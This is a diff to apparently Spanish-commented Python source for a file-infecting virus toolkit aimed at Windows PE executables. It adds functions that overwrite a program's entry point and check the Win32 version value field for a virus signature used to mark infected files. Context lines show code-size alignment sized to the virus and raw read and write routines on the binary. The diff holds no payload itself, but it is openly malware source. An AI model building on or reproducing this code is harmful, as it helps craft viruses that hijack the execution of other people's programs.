@@ -77,6 +77,15 @@ def getBinaryImageBase(binary_):
         return binary_.getImageBase()
 
 '''
+    Funciones para modificar valores del PE
+'''
+def setBinaryRVAEntryPoint(binary_,new_rva):
+    '''
+    Función para modificar el entry point en la cabecera
+    '''
+    binary_.setRVAEntryPoint(new_rva)
+
+'''
     Funciones para alinear valores
 '''
 def alignSizeOfCode(binary_,type_of_alignment,virus_size):
@@ -98,6 +107,11 @@ def alignSizeOfCode(binary_,type_of_alignment,virus_size):
             original_size = x - rest
             binary_.setSizeOfCode(original_size)
 
+
+'''
+    Funciones para poderse mover, escribir
+    y leer del binario
+'''
 def RVA_Seek(binary_,rva,seek_type):
     '''
     Método para moverse a través del binario a base de 
@@ -126,6 +140,21 @@ def RVA_Write(binary_,buffer_):
     if binary_.type == 'PE_File':
         binary_.write_file_rva(buffer_)
 
+
+'''
+    Utilidades varias para el binario
+'''
+def checkBinarySign(binary_,sign):
+    '''
+    Función para checkear en un binario la firma de un virus
+    en el campo win32 version value
+    '''
+    if binary_.type == 'PE_File':
+        return binary_.checkSign(sign)
+
+'''
+    Función para acabar con el objeto
+'''
 def killBinary(binary_):
     '''
     Método para finalizar el binario
